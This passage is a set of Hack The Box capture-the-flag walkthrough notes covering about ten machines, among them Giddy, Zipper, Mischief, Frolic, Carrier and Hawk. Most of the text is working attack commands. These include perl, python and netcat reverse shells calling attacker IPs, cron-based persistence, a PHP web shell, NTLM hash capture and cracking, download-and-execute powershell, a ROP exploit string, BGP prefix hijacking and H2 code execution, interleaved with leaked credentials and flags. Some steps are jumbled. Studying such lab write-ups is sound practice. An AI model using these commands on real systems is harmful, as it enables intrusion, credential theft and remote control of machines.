chmod +s /tmp/sh
$ touch -- "-e sh root.rdb"
 
Now we can upgrade to a meterpreter shell with elf method used before to upload a socat or nercat or wherever we need.
 
11) Now we got root privs and now we can read the user flag
12)now we read the crontab
* * * * * root /tmp/nc 172.20.0.2 9001 -e /bin/sh
13)now reading for clean file in cron.d on backup container we see we can upload our cronjob to it and get a reverse shell on backup container to do this we have to:
now we have to upload a nc or ncat to www container box:
once we upload everything we then
 
create our cronjob with:  echo '* * * * * root /tmp/nc 172.20.0.3 7000' > myclean
or use perl:
 
1)* * * * * root perl -e 'use Socket;$i="172.20.0.3";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
2)create a script with perl use the same code above for perl shell and upload to /tmp
upload a cronjob to /etc/cron.d that execute that perl script like this:
* * * * * root /bin/sh -c "perl /tmp/shell.pl"
setup your ncat listening for incoming connections on www box.
 
Once we have acces to backup box we must find the root flag doing a find -name root.txt
 
we locate the root flag in  root.txt: backupfs/tmp/d/root/root.txt
 
50d0db644c8d5ff5312ef3d17c2ed205
 
********************************************
 
HTB GIDDY
1)Enumeration with zenmap show open ports 80,443,3389
2)Going with browser to the machine ip shows us its a IIS server.
3)Running dirbuster we found 2 interesting dirs
/remote for powershell
/cvm
4)Running owasp-zap i managed to found to sqli injectable points the most important being http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1
5)I try to inject but not response just errors
6)Running sqlmap shows us its a mssql database
7)So i can try to get a sql-shell with this command
 
sqlmap -u 'http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1*" -│[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy                                    
-dbms=mssql' --sql-shell
 
Annnd we got a shell.
7)doing some research we found this command
EXEC master..xp_dirtree '\\10.10.15.43\dumbythegrey'
to show us all the dirs and files from a remote machine, but we must find a way to intercept this data so we use Responder
8)setting up responder with $responder -I tun0 -wrf and launching the above command we manage to intercept some critical info:****************************************
[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:b1878626a82d72fa:5B8D62AF69AB5797FEBC42777BDBE880:0101000000000000C0653150DE09D2018EF95EAB42F055BB000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000017190205C39113DFCE10FD89661C8AAC982FB5755698C1A119AA5744811E38080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E0034003300000000000000000000000000
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
**************************************************
9) now lets crack that hash
 
cmd.exe /c 'C:\Users\Stacy\launcher.bat'
 
using hashcat -m 54000 file.hash rockyou.txt we found the password is:
 
xNnWo6272k7x
 
10)So with this credentials we can go to /remote and try it
on first attemp with creds its shows us some shells running but instantly logged out
11)trying again seems to got an error
12)After so much strugging i found to login with a the creds into a powershell we must provide the full path user
 
MACHINE\User   so its GIDDY\Stacy
13)And we managed to login and grab the user flag
14)now into priv scalation
15)Running basic enumeration for win machines was able to found not so much
16)Then in stacy Documents Folder we found an app called Unify-video
17)we search online and found a vulnerability priv esc for this specific app
the vulnerability https://www.exploit-db.com/exploits/43390/
*****The ProgramData folder its a dir located in C:\ but its hidden*****
18)So we create a bat file with our payload:
echo @off
C:\Users\Stacy\Documents\nc -e cmd 10.10.15.43 4949
19)Now we have to convert this bat to an exe file so i found a site online that does that and download the exe file
20)upload netcat and taskkill.exe with wget or iwr command like this:
wget http://10.10.12.197:80/nc.exe -UseBasicParsing -OutFile nc.exe
wget http://10.10.12.197:80/taskkill.exe -UseBasicParsing -OutFile taskkill.exe
21)now move your taskkill.exe file to the app data folder located in C:\ProgramData\unifi-video
22)start your nc listener locally
23)go to that dir and start and stop the unifi-video service like this:
start-service "Ubiquiti UniFi Video"
stop-service "Ubiquiti UniFi Video"; ps;   ## notice we append the ps command for a powershell process
24)And we got a reverse nc shell with authority-system privileges
25)Grab your root flag  : >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> CF559C6C121F683BF3E56891E80641B1
 
*************************************************
 
HTB ZIPPER
1)Nmap shows open port 80 and 22
2)navigating to 80 show default apache server
3)Running dirb with a custom wordlist for webapps we found /zabbix login page
4)we login as guest and try to find something,
we found zabbix was changed to zapper so we can try as login and bingo!!
5)user its unable to login dashboard so we must find another way.
6)Doing so much thing i managed to get the api json zabbix its using /jsrpc.php
7)So i create a script with python to manage to connect to api and make requests
8)I make a request to create a new user with super admin privileges and we login to the dashboard
create a script for zabbix administrator a reverse shell with perl:
perl -e 'use Socket;$i="10.10.15.166";$p=444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
9)The execute script must execute on zabbix agent not on server cuz server its a docker container(rabbit hole)
10)server id to execute script its 10106
11)we managed to get a reverse shell but cant read files.
found a passwd ZippityDoDah
12)now get a reverse shell for zabbix agent and once login spawn a tty shell with
python3 -c 'import pty; pty.spawn("/bin/sh")''
13)grab the user flag
14)copy the ssh key for a stable shell
15)looking for basic privilege scalation an enumeration.
we see theres a binary with root privileges that SUID enabled
running strings zabbix-service
we see its running systemctl as root so we can do that
to remove unwanted symbolic links   :   find -name l -delete
so first:
1) exporth PATH=.
2) /bin/echo '/bin/sh -i' >> systemctl
3) /bin/chmod +x systemctl
4) ./zabbix-service ... start
5) read the root flag  >>>>>>>>>>>>>>>>>>>>>  a7c743d35b8efbedfd9336492a8eab6e
 
*****************************************
 
HTB MISCHIEF
1)Enumeration shows open port 22, 3366 and upd 161 running snmp
2)So we do snmpwalk -v 1 -c 10.10.10.92 and throws a bunch of info
3)searching for good info i found on snmp log a user and a password:   loki:godofmischiefisloki running on a SimpleHTTPAuthServer.
4)then going to 10.10.10.92:3366 ask for user and password so we provide the credentials we found and login
5)There some new credentials in here loki:trickeryanddeceit
6)we found an image
7)image its rabitt hole
8)from nmap full scan we notice some more ports and from snmpwalk we notice apache and mysql its running but not showing up so it mus be ipv6.
9)so we download an ipv6 ennumeration tool like enyx for snmp run it and shows ipv6 address: [dead:beef::250:56ff:feb9:a728]
10)remember ipv6 adress changes every reboot
11) now we use it in browser and another login page tried all creds with user we got so far but theyre not working.
12) keep enummerating
13)tried all basic users standar users, none seems to work after i remember another standard user administrator -.- that worked with second password.
14)we managed to login to the Command Execution Panel and try a few commands and looks that theyre not working.
15)In fact they work but as we see in snmpwalk enumeration all the output its being send to /dev/null so we must find a way to redirect it to us.
16)So we must run our command like this: cat /home/loki/* &> STDOUT  ||->>>>>>>>>
       so in shorter explaination we redirect the output to the standard or STDOUT and we cat /home/loki/*  (all) because
       while i was trying to read the contents it doesnt work if i just typed /home/loki/credentials so we cat all and
       redirect it to stdout!
and got ssh passwd   lokiisthebestnorsegod
17)Privilege Scalation
18)Searching in lokis home im not being able to find anything also loki's user cannot run sudo or su so we must find a way to get to another user.
 
The user we use to get the loki's password it was www-data user so we execute a reverse ipv6 shell from command console on ipv6 browser with:
 
notice we have to use our ipv6 local address
 
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1384",4444,0,3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 
Alternatively we can run the same python reverse shell with loki user
but before the command we must append
$ systemd-run (python command) **but without the scope value "0,3"**
 
with the loki shell we can place the same python script in a /tmp/ fle and then
make a crontab into the RCE form to execute it as www-data
loki@Mischief:~$ cat /tmp/shell.sh
#!/bin/bash
python -c 'import
socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1068",2222));os.dup2(s.fleno(),0);
os.dup2(s.fleno(),1); os.dup2(s.fleno(),2);p=pty.spawn("/bin/sh");'
ping -c 2 127.0.0.1&&(crontab -l 2>/dev/null; echo "*/1 * * * *
/tmp/shell") | crontab - ;
wait a minute and usllget the reverse shell
 
and got ourselves a shell for www-data and it can execute sudo or su.
19)we must find www-data su password and we found in loki's .bash_history in the python part:  
 
lokipasswordmischieftrickery
 
we gain root access but the flag isnt located here, get a shell it says.
 
20)But we are in a root shell we dont need anything more so we search for another root.txt file with command
 
find -name root.*
 
and the flag its stored in usr/lib/gcc/x86_64-linux-gnu/7/root.txt
 
so we navigate to that dir and cat root.txt with its content:
 
ae155fad479c56f912c65d7be4487807
 
************************************************
 
HTB FROLIC
 
1) As always enum
2) visit 2 sites and dirbuster in diferent ports 9999 and 1880 open 22 open 139 and 445
3) found 2 sites on 9999 site : /backup and /admin login to admin are in source code and js script
4) admin login shows a weird code
5) backup page show user and pass txt admin:imnothuman
6)the weird code its formated in Ook go to decode.fr and decode it
7)the decoded Ook strings points to a dir /asdiSIAJJ0QWE9JAS/
8)dir contains encoded zip to decode and download go to freeformater
9)crack zip file with fcrackzip -v -u -D -p /usr/share/dic/words
10) password
11)found index.php with another coded
12) decoded first hex to ascii to base64 to brainfuck and get the password "idkwhatispass"
13)found dir with gobuster and medium dic for playsms
14)get a meterpreter session with
exploit/multi/http/playsms_uploadcsv_exec user and pass you got
15)get the user flag
16)ldd rop to know the lib adrres its using
17)export PATH=/usr/lib/gcc/i686-linux-gnu/5:/sbin:/bin:/usr/sbin:/usr/bin
18)start searching for system, execve, exit and /bin/sh adresss
19)upload the script libc-search.c
20)compile it like this gcc libc-search.c -o libc-search -lc -ldl and run
21)search -s system then -s exit then -s execve
22)search -p /bin/sh -b "libcstring"  --------> 0xb7e190003
23)begin to make our exploit with python
The exit address is: 0xb7e479d0
The system address is: 0xb7e53da0
The execve address is: 0xb7ec97e0
The /bin/sh address is: 0xb7f74a0b
cat /proc/$$/maps | grep stack bffdf000-c0000000 rw-p 00000000 00:00 0 [stack]
 
## stack address begins wiht \x00 so we changed to \xe0
 
exit() -> "\xd0\x79\xe4\xb7"; system() -> "\xa0\x3d\xe5\xb7"; execve() -> "\xe0\x97\xec\xb7"
stack is \xe0\xf0\xfd\xbf
so buffer at 48, dummy at 4, execve pointer, exit pointer, /bin/sh pointer, and stack pointer which acts as system
 
so exploit its
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>    
python -c 'print "A"*48+"B"*4+"\xe0\x97\xec\xb7"+"\xc8\x97\xec\xb7"+"\x0b\x4a\xf7\xb7"+"\xe0\xf0\xfd\xbf"+"\xe0\xf0\xfd\xbf"'
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
24)run ./rop $(exploit)
25)cat root flag   85d3fdf03f969892538ba9a731826222
 
**********************************************
 
HTB CARRIER
1)Do a full port scan TCP and UDP
2)Found login page whic contains some codes about errors saying password its the chassis number
3)got port 161 running snmp
4)use snmpwalk -v 1 -c public 10.10.10.105
5) got the number SN#NET_45JDX23
6)Login with user admin and the pass
Notice the tickets area with useful info normally unresolved issues are vulns.
7)Notice the diagnostics verify status
8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
9)the commands must be encoded in base 64 to work
9)so we can chain another command to it like nc but /bin/sh its giving us problems so we specify /bin/bash
quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
in base64 encoded:
cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
10)get user flag
Previusly with gobuster we manage to find a diagram with the servers that linked with quagga.
11) find the routes and from hint in login pages tickets we get:
"one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
 
12)10.120.15.10 has an FTP server, .1 does not. So I'm pretty sure 10.120.15.10 is the FTP server.
 
I also tried injecting a network in bgpd.conf, namely:
 
"network 10.120.15.0/21"
 
Then systemctrl restart quagga.
 
I then tried to sniff with tcpdump on eth1.
 
Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
We cab upload a nmap binary to scan for network in local.
The box you get a shell on is AS100.
The "important FTP server" is connected to AS300.
AS100 is connected to both AS200 and AS300.
Connections to the FTP server are probably originating from AS200. To reach 10.120.15.10 it need to go through AS300, we want it to go through us instead by claiming we have this prefix connected to us even when we don't.
 
We receive traffic from AS200 on eth1, so eth1 it is.
 
I didn't get anything though.
 
But this would be just a prefix hijack, the ASPATH is just as long both going through us (AS100) as through AS300. Hence a subprefix hijack attack is needed, I think?
 
In a subprefix hijack we need to announce a new prefix, i.e. a longer prefix, from what I understand from doing some reading. That means ... a more specific subnet?
 
the FTP server is at 10.120.15.10, you need to configure eth2 up as that IP, and you need to inject a network with a long prefix, such as 10.120.15.8/29 into the bgpd.conf, .8 because the subnetmask only allows for a few hosts, and we want it to overlap with .10.
 
Try that, and be aware of that pesky script under /opt which resets the whole thing, I just gave it a .bak extension to prevent the thing from running.
 
Then you should start getting FTP traffic.
 
so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
restart the quagga service
Then start up nc and bind it to that IP and listen for incoming FTP:
Alternate we can use ftpd.py and upload to the machine.
when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
13)credentials are:
                        root:BGPtelc0rout1ng
 
14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
15)get root flag and secret
Root flag: 2832e552061532250ac2a21478fd4866
 
*********************************************
 
HTB SECNOTES
1)Enumeration with nmap discovering open ports full tcp scan all ports
2)enter web page and create a user with a sqli query ' OR '1'='1
3)search in the notes for user and pass  :  92g!mA8BGjOirkL%OG*&
4)login with smbclient and upload a shell like this:
       
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
 
5)Using nc.exe establish a reverse connection to attacker machine wiht nc -nv 10.10.xx.xx 4444 -e cmd.exe
6)notice the weird distro folder containig ubuntu so we must find bash.exe running dir bash.exe /s /p
7)run bash.exe and search for the past and login with smbclient with credentials:
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\127.0.0.1\c$
8)GET the root.txt flag
 
***********************************************
 
HTB YPUFFY
1) Enum ldap and find the hashes for alice user
2) use the hashes with smb login
3) get the ssh key and login trough ssh
4) read the doas.conf httpd.conf and sshd_config
5) try to enumerate users and principals with curl with command /usr/local/bin/curl -i 'http://127.0.0.1/sshauth?type=principals&username=root'
6)go to /tmp and generate a ssh id_rsa key for alice
7)generate certificate for principal with id_rsa private key generated with command
doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I alice1978 -n 3m3rgencyB4ckd00r id_rsa
8)login with ssh to root@localhost with private key
9)flag
 
***********************************************
 
HTB Bounty
1)Enumerate and find .aspx files
2)find upload webapp and use format web.config with correct payload
3)upload payload and use your RCE
4)powershell download files thorugh webshell
 - powershell $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('http://10.10.15.x/payload.exe','C:\netpub\wwwroot\UploadedFiles\payload.exe')
 - powershell \path\to\payload
5)run payload with powershell
6)multi handler meterpreter
7)migrate to x64 shell
You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject
set payload windows/x64/meterpreter/reverse_tcp
or looking for proccess that are already running in x64 and migrate to it
8)run post explotation module and exploit(root)
 
******************************************************
 
HTB WALDO
 
1) Usando burp suite se encuentra la ruta en la cual se puede hacer el directory transversal desde este se encuentra la vulnerabilidad y notamos que existe un filtro el cual se puede evadir usando ./ para ir al primer directorio y luego ....//(para saltar el filtro).
2) Al encontrar la llave ssh del usuario nobody esta se debe formatear y se deben borrar todos los caracteres "\n"asi como "\"y se formatea en https://www.samltool.com/format_privatekey.php.
 
3) logearse por ssh con el usuario nobody
 
4)login again with the same ssh key from remote machine as monitor to localhost with args -t bash -norc" without quotes to break the default bash login
 
5)run "/usr/bin/tac /root/root.txt
 
***************************************************
 
HTB HAWK
 
1)As usual enum nmap shows port 80, 21 , 22, 8082 ---> runing H2 DATABASE
2)web page show login, register and few rabbit holes
3)dirb shows a bunch of dirs and files none of those seems to help
4)login through ftp on port 21 with user anonymous found a dir with a encrypted file on it
5)using file + name of the encrypt file shows "openssl enc'd data with salted password, base64 encoded"
6)research for a tool to do de decrypt procces and found https://github.com/deltaclock/go-openssl-bruteforce
7)Download and bruteforce with ./openssl-brute -file /path
8)decrypted file shows:
Daniel,
 
Following the password for the portal:
 
PencilKeyboardScanner123
 
Please let us know when the portal is ready.
 
Kind Regards,
 
IT department
 
9)The credentials they sad are mean user daniel but for work in portal he needs to be admin so the user admin and password in the mail.
10)login and search for modules and enable php filter save config and go to content>> article >> new article
11) in name any name in content of the article paste your shell ill use p0wny shell.
12)grab user flag
13)enumerating for config files i was able to locate /var/www/html/sites/default/settings.php where it its stored the user and password for database which is drupal:drupal4hawk and trying it with daniel i managed to login through ssh.
14)enumeration with enum4lin i was able to realize the service for h2 console when we acces through browser its says it only allows local connections to the service so we have to create a ssh tunnel to it:
 
└──╼ #ssh -D 1080 -L6801:127.0.0.1:7082 -L6802:127.0.0.1:8082 daniel@10.10.10.102
another way of ssh tunneling is:
daniel@hawk:~$
daniel@hawk:~$ <---here i type ~C ssh> -D 8082
Forwarding port.
 
then we can verify im listenning on this port on local machine:
 
netstat -anlp | grep 8082
tcp 0 0 127.0.0.1:8082 0.0.0.0:* LISTEN 3445/ssh
tcp6 0 0 ::1:8082 :::* LISTEN 3445/ssh
 
once we create the tunnel just access with 127.0.0.1:6802 for tunneling method 1 or 127.0.0.1:8082 for method 2 through browser .
 
15)once we access we found by trial and error that database its test no ˜test and user was "sa" and password was the same "sa" so i login in and voila!
 
16) once we got the H2 console so we can execute java code for creating an ALIAS and run
 
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\A"); return s.hasNext() ? s.next() : ""; }$$;
 
then just CALL SHELLEXEC('cat root.txt')
 
Another viable way its using 44422.py exploit from exploit.db with python3, python2 cause problems.
 
with this command
└──╼ #python3 44422.py -H 127.0.0.1:6802 -d jdbc:h2:tcp://10.10.10.102/~/drupal
 
where the -d argument its the host where the database its allocated look we dont need any user and password just the exploit as it its with the correct database path -d jdbc:h2:tcp://10.10.10.102/~/drupal.
54f3e840fe5564b42a8320fd2b608ba0
DONE!!
